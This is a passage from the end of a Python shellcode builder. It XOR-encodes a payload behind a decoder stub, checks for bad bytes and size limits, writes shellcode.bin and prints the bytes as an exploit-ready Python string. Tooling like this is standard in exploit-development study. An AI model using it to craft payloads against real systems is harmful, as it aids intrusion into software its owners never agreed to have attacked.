            problems.append("no XOR key keeps both the stub and the encoded body clean")
        else:
            key, _, stub_placed = stub
            stub_bytes = b"".join(encoding for _, _, encoding in stub_placed)
            code = stub_bytes + bytes(b ^ key for b in plain)
            print(f"[!] XOR_ENCODER: {len(stub_bytes)}-byte stub, key 0x{key:02x}. It decodes in place, so the page must be writable.")
            if plain_bad:
                print(f"[i] the body holds {len(plain_bad)} bad byte(s) as written, which is what the encoder is for."
                      " The stub decodes them before they run, so they are not problems:")
                for problem in plain_bad:
                    print(f"    {problem}")
            problems += listing(stub_placed)
            problems += bad_bytes(stub_placed) + forward_calls(stub_placed)
            problems += bad_bytes(placed, len(stub_bytes), key)
            print(f"    {len(stub_bytes):04x}  ... {len(plain)} encoded bytes, the code listed above")

    for problem in problems:
        print(f"[-] {problem}")
    bad_count = sum(1 for byte in code if byte in BAD)
    print(f"[+] {len(code)} bytes" + (f" of MAX_SIZE {MAX_SIZE}" if MAX_SIZE else ""))
    if MAX_SIZE and len(code) > MAX_SIZE:
        problems.append(f"{len(code)} bytes is over MAX_SIZE {MAX_SIZE}")
        print(f"[-] {problems[-1]}")
    print(f"[{'-' if bad_count else '+'}] {bad_count} bad bytes against {' '.join(f'{b:02x}' for b in sorted(BAD))}")
    print(f"[-] {len(problems)} problem(s)" if problems else "[+] 0 problems")

    with open("shellcode.bin", "wb") as handle:
        handle.write(code)
    print("[+] wrote shellcode.bin")
    print('shellcode = b""')
    for start in range(0, len(code), 16):
        print('shellcode += b"' + "".join(f"\\x{byte:02x}" for byte in code[start:start + 16]) + '"')
    return 1 if problems else 0


if __name__ == "__main__":
    sys.exit(main())
